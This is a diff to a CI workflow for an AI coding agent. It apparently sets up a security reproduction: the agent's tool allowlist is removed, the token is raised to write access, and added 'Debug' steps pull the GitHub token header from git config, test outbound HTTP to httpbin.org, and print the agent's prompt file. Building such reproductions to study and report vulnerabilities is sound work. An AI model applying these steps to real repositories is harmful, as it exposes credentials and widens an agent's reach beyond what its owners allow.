@@ -3,12 +3,8 @@ name: Claude Code
 on:
   issue_comment:
     types: [created]
-  pull_request_review_comment:
-    types: [created]
   issues:
     types: [opened, assigned]
-  pull_request_review:
-    types: [submitted]
 
 permissions: {}
 
@@ -16,17 +12,17 @@ jobs:
   claude:
     if: |
       (github.event_name == 'issue_comment' && contains(github.event.comment.body, '@claude')) ||
-      (github.event_name == 'pull_request_review_comment' && contains(github.event.comment.body, '@claude')) ||
-      (github.event_name == 'pull_request_review' && contains(github.event.review.body, '@claude')) ||
       (github.event_name == 'issues' && (contains(github.event.issue.body, '@claude') || contains(github.event.issue.title, '@claude')))
     runs-on: ubuntu-24.04
+    # contents:write reproduces the EFFECTIVE token power on production:
+    # the workflow declares contents:read but the OIDC-exchanged App token carries
+    # contents:write and overrides the workflow block.
     permissions:
-      contents: read
+      contents: write
       pull-requests: read
       issues: read
       id-token: write
     steps:
-      # Keep persist-credentials default while anthropics/claude-code-action#1236 is open
       - name: Checkout repository
         uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
         with:
@@ -34,8 +30,27 @@ jobs:
 
       - name: Run Claude Code
         id: claude
-        uses: anthropics/claude-code-action@26ec041249acb0a944c0a47b6c0c13f05dbc5b44 # v1.0.70
+        uses: anthropics/claude-code-action@26ec041249acb0a944c0a47b6c0c13f05dbc5b44 # v1.0.70 (production pin)
         with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
           anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
-          model: claude-sonnet-4-20250514
-          allowed_tools: "Bash(cd:*),Bash(git:*),Bash(make:*),Bash(npm:*),Bash(go:*)"
+          show_full_output: true
+
+      - name: Debug - Token exfiltration path via git config
+        if: always()
+        run: |
+          echo "=== STEP 1: Token stored in git config by checkout ==="
+          git config --list | grep -i "extraheader\|credential\|url.*token\|url.*x-access" || echo "No token in config"
+          echo ""
+          echo "=== STEP 2: Extract token from git config ==="
+          TOKEN_HEADER=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
+          echo "Token header found: $([ -n "$TOKEN_HEADER" ] && echo 'YES' || echo 'NO')"
+          echo ""
+          echo "=== STEP 3: Outbound HTTP from runner ==="
+          npm exec -y -- node -e "fetch('https://httpbin.org/get?proof=npm-exec-network-access').then(r=>r.json()).then(d=>console.log('npm exec outbound HTTP: SUCCESS', d.args.proof)).catch(e=>console.log('npm exec outbound HTTP: FAILED', e.message))" 2>&1 | tail -3
+
+      - name: Debug - Print prompt file
+        if: always()
+        run: |
+          echo "=== Prompt file contents ==="
+          cat /tmp/claude-prompts/claude-prompt.txt 2>/dev/null || cat $RUNNER_TEMP/claude-prompts/claude-prompt.txt 2>/dev/null || echo "Prompt file not found (action failed before prompt creation)"
